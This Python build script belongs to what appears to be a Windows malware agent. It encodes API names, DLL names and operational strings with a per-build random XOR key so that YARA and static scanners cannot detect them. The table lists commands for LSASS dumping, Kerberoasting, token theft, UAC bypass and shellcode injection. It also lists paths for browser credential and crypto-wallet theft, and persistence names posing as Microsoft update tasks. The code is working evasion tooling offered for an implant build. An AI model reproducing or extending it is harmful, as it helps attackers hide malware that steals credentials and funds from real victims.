#!/usr/bin/env python3
"""
Generate agent/include/evs_strings.h — per-build random XOR key for all
API / DLL name obfuscation arrays.  Replaces the hardcoded 0xba constant
that was a static YARA signature.

Run: python tools/gen_evs_strings.py
Called automatically by: make config
"""
import os
import secrets

# ── Master string table ────────────────────────────────────────────────────
# name → C identifier suffix (EVS_<suffix>)
STRINGS = {
    # DLL names
    "ntdll.dll":         "dll_ntdll",
    "kernel32.dll":      "dll_kernel32",
    "kernelbase.dll":    "dll_kernelbase",
    "xpsservices.dll":   "dll_xpsservices",
    "advapi32.dll":      "dll_advapi32",
    "amsi.dll":          "dll_amsi",
    "secur32.dll":       "dll_secur32",
    "netapi32.dll":      "dll_netapi32",
    "winhttp.dll":       "dll_winhttp",
    "gdi32.dll":         "dll_gdi32",
    "user32.dll":        "dll_user32",

    # Nt* syscall names (ntdll)
    "NtOpenProcess":              "fn_NtOpenProcess",
    "NtAllocateVirtualMemory":    "fn_NtAllocateVirtualMemory",
    "NtWriteVirtualMemory":       "fn_NtWriteVirtualMemory",
    "NtProtectVirtualMemory":     "fn_NtProtectVirtualMemory",
    "NtCreateThreadEx":           "fn_NtCreateThreadEx",
    "NtClose":                    "fn_NtClose",
    "NtOpenThread":               "fn_NtOpenThread",
    "NtSuspendThread":            "fn_NtSuspendThread",
    "NtResumeThread":             "fn_NtResumeThread",
    "NtGetContextThread":         "fn_NtGetContextThread",
    "NtSetContextThread":         "fn_NtSetContextThread",
    "NtQueueApcThread":           "fn_NtQueueApcThread",
    "NtCreateSection":            "fn_NtCreateSection",
    "NtMapViewOfSection":         "fn_NtMapViewOfSection",
    "NtUnmapViewOfSection":       "fn_NtUnmapViewOfSection",
    "NtReadVirtualMemory":        "fn_NtReadVirtualMemory",
    "NtQueryInformationProcess":  "fn_NtQueryInformationProcess",
    "NtContinue":                 "fn_NtContinue",
    "NtWaitForSingleObject":      "fn_NtWaitForSingleObject",
    "NtQuerySystemInformation":   "fn_NtQuerySystemInformation",

    # ntdll helpers / ETW
    "RtlCaptureContext":          "fn_RtlCaptureContext",
    "RtlUserThreadStart":         "fn_RtlUserThreadStart",
    "EtwEventWrite":              "fn_EtwEventWrite",
    "EtwTiLogOpenProcess":        "fn_EtwTiLogOpenProcess",
    "EtwTiLogReadWriteVm":        "fn_EtwTiLogReadWriteVm",
    "EtwTiLogDuplicateHandle":    "fn_EtwTiLogDuplicateHandle",

    # AMSI (amsi.dll)
    "AmsiScanBuffer":             "fn_AmsiScanBuffer",
    "AmsiScanString":             "fn_AmsiScanString",

    # advapi32.dll
    "AdjustTokenPrivileges":      "fn_AdjustTokenPrivileges",
    "DuplicateTokenEx":           "fn_DuplicateTokenEx",
    "ImpersonateLoggedOnUser":    "fn_ImpersonateLoggedOnUser",
    "LogonUserA":                 "fn_LogonUserA",
    "LookupPrivilegeNameA":       "fn_LookupPrivilegeNameA",
    "LookupPrivilegeValueA":      "fn_LookupPrivilegeValueA",
    "OpenProcessToken":           "fn_OpenProcessToken",
    "OpenThreadToken":            "fn_OpenThreadToken",
    "RevertToSelf":               "fn_RevertToSelf",
    "CloseServiceHandle":         "fn_CloseServiceHandle",
    "EnumServicesStatusExA":      "fn_EnumServicesStatusExA",
    "OpenSCManagerA":             "fn_OpenSCManagerA",
    "OpenServiceA":               "fn_OpenServiceA",
    "QueryServiceConfigA":        "fn_QueryServiceConfigA",
    "RegisterServiceCtrlHandlerA":"fn_RegisterServiceCtrlHandlerA",
    "SetServiceStatus":           "fn_SetServiceStatus",
    "StartServiceCtrlDispatcherA":"fn_StartServiceCtrlDispatcherA",
    "RegDeleteTreeA":             "fn_RegDeleteTreeA",
    "GetTokenInformation":        "fn_GetTokenInformation",
    "SetThreadToken":             "fn_SetThreadToken",
    "PrivilegeCheck":             "fn_PrivilegeCheck",
    "AllocateAndInitializeSid":   "fn_AllocateAndInitializeSid",
    "EqualSid":                   "fn_EqualSid",
    "FreeSid":                    "fn_FreeSid",
    "ImpersonateNamedPipeClient": "fn_ImpersonateNamedPipeClient",
    "CreateProcessWithTokenW":    "fn_CreateProcessWithTokenW",
    "CreateProcessAsUserW":       "fn_CreateProcessAsUserW",
    "CredEnumerateA":             "fn_CredEnumerateA",
    "CredFree":                   "fn_CredFree",

    # kernel32.dll
    "InitializeProcThreadAttributeList": "fn_InitializeProcThreadAttributeList",
    "UpdateProcThreadAttribute":         "fn_UpdateProcThreadAttribute",
    "DeleteProcThreadAttributeList":     "fn_DeleteProcThreadAttributeList",
    "ResumeThread":               "fn_ResumeThread",
    "GetComputerNameA":           "fn_GetComputerNameA",
    "GetComputerNameW":           "fn_GetComputerNameW",
    "GetComputerNameExW":         "fn_GetComputerNameExW",
    "GetNativeSystemInfo":        "fn_GetNativeSystemInfo",
    "GlobalMemoryStatusEx":       "fn_GlobalMemoryStatusEx",
    "VirtualProtect":             "fn_VirtualProtect",
    "VirtualAlloc":               "fn_VirtualAlloc",
    "CreateMutexW":               "fn_CreateMutexW",
    "ReleaseMutex":               "fn_ReleaseMutex",
    "MoveFileExA":                "fn_MoveFileExA",
    "DuplicateHandle":            "fn_DuplicateHandle",
    "OpenProcess":                "fn_OpenProcess",
    "Sleep":                      "fn_Sleep",
    "SetEvent":                   "fn_SetEvent",
    "CreateFileMappingA":         "fn_CreateFileMappingA",
    "CreateFileMappingW":         "fn_CreateFileMappingW",
    "OpenFileMappingA":           "fn_OpenFileMappingA",
    "MapViewOfFile":              "fn_MapViewOfFile",
    "UnmapViewOfFile":            "fn_UnmapViewOfFile",
    "WriteFile":                  "fn_WriteFile",
    "ReadFile":                   "fn_ReadFile",
    "SetFilePointer":             "fn_SetFilePointer",
    "GetFileSizeEx":              "fn_GetFileSizeEx",
    "CreateFileA":                "fn_CreateFileA",
    "CreateFileW":                "fn_CreateFileW",
    "DeleteFileA":                "fn_DeleteFileA",
    "CopyFileA":                  "fn_CopyFileA",
    "FindFirstFileA":             "fn_FindFirstFileA",
    "FindNextFileA":              "fn_FindNextFileA",
    "FindClose":                  "fn_FindClose",
    "GetFileAttributesA":         "fn_GetFileAttributesA",
    "QueryFullProcessImageNameW": "fn_QueryFullProcessImageNameW",
    "CreateNamedPipeA":           "fn_CreateNamedPipeA",
    "ConnectNamedPipe":           "fn_ConnectNamedPipe",
    "IsWow64Process":             "fn_IsWow64Process",
    "RtlGetVersion":              "fn_RtlGetVersion",
    "GetSystemDirectoryW":        "fn_GetSystemDirectoryW",
    "IsProcessorFeaturePresent":  "fn_IsProcessorFeaturePresent",
    "VirtualAllocEx":             "fn_VirtualAllocEx",
    "VirtualFreeEx":              "fn_VirtualFreeEx",
    "VirtualQueryEx":             "fn_VirtualQueryEx",
    "ReadProcessMemory":          "fn_ReadProcessMemory",
    "WriteProcessMemory":         "fn_WriteProcessMemory",
    "CreateThread":               "fn_CreateThread",
    "CreateRemoteThread":         "fn_CreateRemoteThread",
    "CreateToolhelp32Snapshot":   "fn_CreateToolhelp32Snapshot",
    "Process32First":             "fn_Process32First",
    "Process32FirstW":            "fn_Process32FirstW",
    "Process32Next":              "fn_Process32Next",
    "Process32NextW":             "fn_Process32NextW",
    "Thread32First":              "fn_Thread32First",
    "Thread32Next":               "fn_Thread32Next",

    # bcrypt.dll — loaded dynamically to hide AES/hash ops from IAT
    "bcrypt.dll":                           "dll_bcrypt",
    "BCryptGenRandom":                      "fn_BCryptGenRandom",
    "BCryptOpenAlgorithmProvider":          "fn_BCryptOpenAlgorithmProvider",
    "BCryptSetProperty":                    "fn_BCryptSetProperty",
    "BCryptGetProperty":                    "fn_BCryptGetProperty",
    "BCryptCloseAlgorithmProvider":         "fn_BCryptCloseAlgorithmProvider",
    "BCryptCreateHash":                     "fn_BCryptCreateHash",
    "BCryptHashData":                       "fn_BCryptHashData",
    "BCryptFinishHash":                     "fn_BCryptFinishHash",
    "BCryptDestroyHash":                    "fn_BCryptDestroyHash",
    "BCryptGenerateSymmetricKey":           "fn_BCryptGenerateSymmetricKey",
    "BCryptDecrypt":                        "fn_BCryptDecrypt",
    "BCryptDestroyKey":                     "fn_BCryptDestroyKey",

    # crypt32.dll — loaded dynamically; cert management + DPAPI
    "crypt32.dll":                      "dll_crypt32",
    "CertOpenStore":                    "fn_CertOpenStore",
    "CertAddEncodedCertificateToStore": "fn_CertAddEncodedCertificateToStore",
    "CertOpenSystemStoreA":             "fn_CertOpenSystemStoreA",
    "PFXImportCertStore":               "fn_PFXImportCertStore",
    "CryptUnprotectData":               "fn_CryptUnprotectData",
    "CertCloseStore":                   "fn_CertCloseStore",
    "CertFreeCertificateContext":       "fn_CertFreeCertificateContext",
    "CertFindCertificateInStore":       "fn_CertFindCertificateInStore",
    "CertGetCertificateContextProperty":"fn_CertGetCertificateContextProperty",
    "CertDeleteCertificateFromStore":   "fn_CertDeleteCertificateFromStore",

    # winspool.drv
    "winspool.drv":               "dll_winspool",
    "OpenPrinterW":               "fn_OpenPrinterW",
    "ClosePrinter":               "fn_ClosePrinter",

    # shell32.dll
    "shell32.dll":                "dll_shell32",
    "ShellExecuteExW":            "fn_ShellExecuteExW",
    "ShellExecuteExA":            "fn_ShellExecuteExA",
    "CheckTokenMembership":       "fn_CheckTokenMembership",

    # mscoree.dll
    "mscoree.dll":                "dll_mscoree",
    "CorBindToRuntimeEx":         "fn_CorBindToRuntimeEx",

    # advapi32 extra
    "RegDeleteKeyA":              "fn_RegDeleteKeyA",
    "RegCreateKeyExA":            "fn_RegCreateKeyExA",
    "RegSetValueExA":             "fn_RegSetValueExA",
    "RegCloseKey":                "fn_RegCloseKey",

    # secur32.dll
    "LsaConnectUntrusted":           "fn_LsaConnectUntrusted",
    "LsaLookupAuthenticationPackage":"fn_LsaLookupAuthenticationPackage",
    "LsaCallAuthenticationPackage":  "fn_LsaCallAuthenticationPackage",
    "LsaFreeReturnBuffer":           "fn_LsaFreeReturnBuffer",

    # netapi32.dll
    "DsGetDcNameW":               "fn_DsGetDcNameW",

    # winhttp.dll
    "WinHttpCrackUrl":            "fn_WinHttpCrackUrl",
    "WinHttpOpen":                "fn_WinHttpOpen",
    "WinHttpConnect":             "fn_WinHttpConnect",
    "WinHttpOpenRequest":         "fn_WinHttpOpenRequest",
    "WinHttpSetOption":           "fn_WinHttpSetOption",
    "WinHttpAddRequestHeaders":   "fn_WinHttpAddRequestHeaders",
    "WinHttpSetTimeouts":         "fn_WinHttpSetTimeouts",
    "WinHttpSendRequest":         "fn_WinHttpSendRequest",
    "WinHttpReceiveResponse":     "fn_WinHttpReceiveResponse",
    "WinHttpQueryOption":         "fn_WinHttpQueryOption",
    "WinHttpQueryDataAvailable":  "fn_WinHttpQueryDataAvailable",
    "WinHttpReadData":            "fn_WinHttpReadData",
    "WinHttpCloseHandle":         "fn_WinHttpCloseHandle",

    # gdi32.dll
    "GetDeviceCaps":              "fn_GetDeviceCaps",
    "CreateCompatibleDC":         "fn_CreateCompatibleDC",
    "CreateCompatibleBitmap":     "fn_CreateCompatibleBitmap",
    "SelectObject":               "fn_SelectObject",
    "BitBlt":                     "fn_BitBlt",
    "StretchBlt":                 "fn_StretchBlt",
    "DeleteDC":                   "fn_DeleteDC",
    "DeleteObject":               "fn_DeleteObject",
    "GetStockObject":             "fn_GetStockObject",
    "SetStretchBltMode":          "fn_SetStretchBltMode",
    "SetBrushOrgEx":              "fn_SetBrushOrgEx",
    "GetDIBits":                  "fn_GetDIBits",

    # user32.dll
    "GetDC":                      "fn_GetDC",
    "ReleaseDC":                  "fn_ReleaseDC",

    # BOF Beacon API names
    "Beacon":                     "str_Beacon",
    "BeaconPrintf":               "str_BeaconPrintf",
    "BeaconOutput":               "str_BeaconOutput",
    "BeaconIsAdmin":              "str_BeaconIsAdmin",
    "BeaconDataParse":            "str_BeaconDataParse",
    "BeaconDataExtract":          "str_BeaconDataExtract",
    "BeaconDataInt":              "str_BeaconDataInt",
    "BeaconDataShort":            "str_BeaconDataShort",
    "BeaconDataLength":           "str_BeaconDataLength",

    # process names
    "winlogon.exe":               "str_winlogon_exe",
    "services.exe":               "str_services_exe",
    "spoolsv.exe":                "str_spoolsv_exe",
    "svchost.exe":                "str_svchost_exe",
    "lsass.exe":                  "str_lsass_exe",
    "RuntimeBroker.exe":          "str_RuntimeBroker_exe",
    "dllhost.exe":                "str_dllhost_exe",
    "explorer.exe":               "str_explorer_exe",

    # WMI class name
    "Win32_Process":              "str_Win32_Process",

    # UAC elevation moniker (stored as bytes; decoded as WCHAR in uac.c)
    "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}":
        "str_elevation_moniker",

    # COM TypeLib registry prefix — avoids "SOFTWARE\Classes\TypeLib" in .rdata
    "SOFTWARE\\Classes\\TypeLib\\":  "str_typelib_prefix",

    # Privilege names — decoded at runtime only where needed
    "SeDebugPrivilege":           "str_SeDebugPrivilege",
    "SeImpersonatePrivilege":     "str_SeImpersonatePrivilege",
    "SeAssignPrimaryTokenPrivilege": "str_SeAssignPrimaryTokenPrivilege",
    "SeIncreaseQuotaPrivilege":  "str_SeIncreaseQuotaPrivilege",

    # Command dispatch names — kept encoded so plaintext never appears in .rdata
    "lsassdump":                  "str_cmd_lsassdump",
    "kerberoast":                 "str_cmd_kerberoast",
    "asreproast":                 "str_cmd_asreproast",
    "steal_token":                "str_cmd_steal_token",
    "hashdump":                   "str_cmd_hashdump",
    "getsystem":                  "str_cmd_getsystem",
    "uacbypass":                  "str_cmd_uacbypass",
    "inject":                     "str_cmd_inject",
    "privesc":                    "str_cmd_privesc",
    "shinject":                   "str_cmd_shinject",
    "execute-assembly":           "str_cmd_execasm",
    "bof":                        "str_cmd_bof",

    # Registry paths used in getsystem / uac — offensive fingerprint
    "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer": "str_reg_installer_policy",
    "AlwaysInstallElevated":      "str_AlwaysInstallElevated",
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System": "str_reg_policies_system",
    "ConsentPromptBehaviorAdmin": "str_ConsentPromptBehaviorAdmin",

    # UAC bypass operational strings — YARA triggers
    "ms-settings":                "str_ms_settings",
    "DelegateExecute":            "str_DelegateExecute",
    "exefile":                    "str_exefile",
    "mscfile":                    "str_mscfile",
    "AppX3xxs313wwkfjhythsb8q46xdssgfr0": "str_wsreset_clsid",
    "fodhelper.exe":              "str_fodhelper_exe",
    "computerdefaults.exe":       "str_computerdefaults_exe",
    "wsreset.exe":                "str_wsreset_exe",
    "sdclt.exe":                  "str_sdclt_exe",
    "eventvwr.exe":               "str_eventvwr_exe",
    "schtasks.exe":               "str_schtasks_exe",
    "lifter.exe":                 "str_lifter_exe",
    "WinMgmt":                    "str_WinMgmt",
    "Environment":                "str_Environment",
    "windir":                     "str_windir",
    "SilentCleanup":              "str_SilentCleanup",

    # SQLite header magic (16 bytes incl. null byte — for browser DB detection)
    "SQLite format 3\x00": "str_sqlite_magic",

    # Browser crypto wallet names
    "MetaMask":              "str_wlt_MetaMask",
    "Phantom":               "str_wlt_Phantom",
    "Trust Wallet":          "str_wlt_TrustWallet",
    "Coinbase Wallet":       "str_wlt_CoinbaseWallet",
    "Coinbase":              "str_wlt_Coinbase",
    "Binance Chain Wallet":  "str_wlt_BinanceChain",
    "Keplr":                 "str_wlt_Keplr",
    "OKX Wallet":            "str_wlt_OKXWallet",

    # Desktop crypto wallet app names / paths
    "Exodus":                "str_wlt_Exodus",
    "exodus.wallet":         "str_wlt_exodus_sub",
    "AtomicWallet":          "str_wlt_AtomicWallet",
    "atomic":                "str_wlt_atomic",
    "Local Storage":         "str_wlt_local_storage",
    "leveldb":               "str_wlt_leveldb",
    "Electrum":              "str_wlt_Electrum",
    "wallets":               "str_wlt_wallets",
    "Bitcoin":               "str_wlt_Bitcoin",
    "wallet.dat":            "str_wlt_wallet_dat",
    "Ethereum":              "str_wlt_Ethereum",
    "keystore":              "str_wlt_keystore",
    "Monero":                "str_wlt_Monero",
    "monero-project":        "str_wlt_monero_proj",
    "monero-gui":            "str_wlt_monero_gui",
    "Litecoin":              "str_wlt_Litecoin",
    "Dogecoin":              "str_wlt_Dogecoin",

    # Chrome extension IDs for crypto wallets
    "nkbihfbeogaeaoehlefnkodbefgpgknn": "ext_id_MetaMask",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "ext_id_Phantom",
    "hnfanknocfeofbddgcijnmhnfnkdnaad": "ext_id_CoinbaseWallet",
    "egjidjbpglichdcondbcbdnbeeppgdph": "ext_id_TrustWallet",
    "fhbohimaelbohpjbbldcngcnapndodjp": "ext_id_BinanceChain",
    "dmkamcknogkgcdfhhbddcghachkejeap": "ext_id_Keplr",
    "mcohilncbfahbmgdjkbpemcciiolgcge": "ext_id_OKXWallet",

    # Persistence masquerade strings
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run": "str_reg_run_key",
    "MicrosoftUpdateService":     "str_persist_reg_val",
    "Microsoft Corporation":      "str_persist_author",
    "LogonTrigger":               "str_persist_trigger_id",
    "MicrosoftEdgeUpdateTaskMachineCore": "str_persist_task_name",

    # Browser profile paths — encoded to defeat YARA/string-scan browser-stealer rules
    "Google\\Chrome\\User Data":                  "str_br_chrome_ud",
    "Microsoft\\Edge\\User Data":                 "str_br_edge_ud",
    "BraveSoftware\\Brave-Browser\\User Data":    "str_br_brave_ud",
    "Chromium\\User Data":                        "str_br_chromium_ud",
    "Opera Software\\Opera Stable":               "str_br_opera",
    "Opera Software\\Opera GX Stable":            "str_br_operagx",
    "Yandex\\YandexBrowser\\User Data":           "str_br_yandex_ud",
    "Vivaldi\\User Data":                         "str_br_vivaldi_ud",

    # Firefox paths — encoded so scanner can't match plaintext artifact
    "Mozilla\\Firefox\\Profiles":              "str_ff_profiles_dir",
    "Program Files\\Mozilla Firefox\\nss3.dll": "str_ff_nss3_pf",
    "Program Files (x86)\\Mozilla Firefox\\nss3.dll": "str_ff_nss3_pf86",
    "Program Files\\Firefox\\nss3.dll":        "str_ff_nss3_bare",
    "%LOCALAPPDATA%\\Mozilla Firefox\\nss3.dll": "str_ff_nss3_local",
}


def _encode(plaintext: str, key: int) -> list[int]:
    """Mirror of evs.c _evs_dec: rotating key XOR, no constant immediate."""
    r = (key ^ 0x5C) & 0xFF
    out = []
    for b in plaintext.encode("latin-1"):
        r = ((r << 3) | (r >> 5)) & 0xFF   # ROL 3
        out.append(b ^ key ^ r)
    return out


def main():
    key = secrets.randbelow(256)
    while key == 0:          # avoid 0 — XOR identity gives plaintext
        key = secrets.randbelow(256)

    lines = [
        "/* AUTO-GENERATED by tools/gen_evs_strings.py — do not edit.",
        " * EVS_KEY is randomised every build; all byte arrays change.",
        " * Defeats static YARA rules that match encoded API/DLL names.",
        " */",
        "#ifndef EVS_STRINGS_H",
        "#define EVS_STRINGS_H",
        "",
        f"#define EVS_KEY 0x{key:02x}u",
        "",
    ]

    prev_group = None
    for plaintext, suffix in STRINGS.items():
        group = suffix.split("_")[0]   # "dll", "fn", or "str"
        if group != prev_group:
            labels = {"dll": "DLL names", "fn": "API / function names",
                      "str": "Misc strings"}
            lines.append(f"/* --- {labels.get(group, group)} --- */")
            prev_group = group

        enc = _encode(plaintext, key)
        arr = ", ".join(f"0x{b:02x}" for b in enc)
        lines.append(
            f"static const unsigned char EVS_{suffix}[{len(enc)}]"
            f" = {{ {arr} }};  /* {plaintext} */"
        )

    lines += [
        "",
        "/* Single XOR-decode helper — one definition in src/evs.c, called everywhere.",
        " * Replaces 100+ identical inline loops that trigger ML-based heuristics. */",
        "#ifndef _EVS_DEC_DECL",
        "#define _EVS_DEC_DECL",
        "#include <stddef.h>",
        "extern void _evs_dec(char *out, const unsigned char *enc, size_t n);",
        "#define EVS_D(out, arr) _evs_dec((out), (arr), sizeof(arr))",
        "#endif",
        "",
        "#endif /* EVS_STRINGS_H */",
        "",
    ]

    out_path = os.path.join(
        os.path.dirname(__file__), "..", "include", "evs_strings.h"
    )
    with open(out_path, "w") as f:
        f.write("\n".join(lines))

    print(f"[ok] wrote {out_path}  (EVS_KEY=0x{key:02x})")
    print(f"     {len(STRINGS)} strings encoded")


if __name__ == "__main__":
    main()
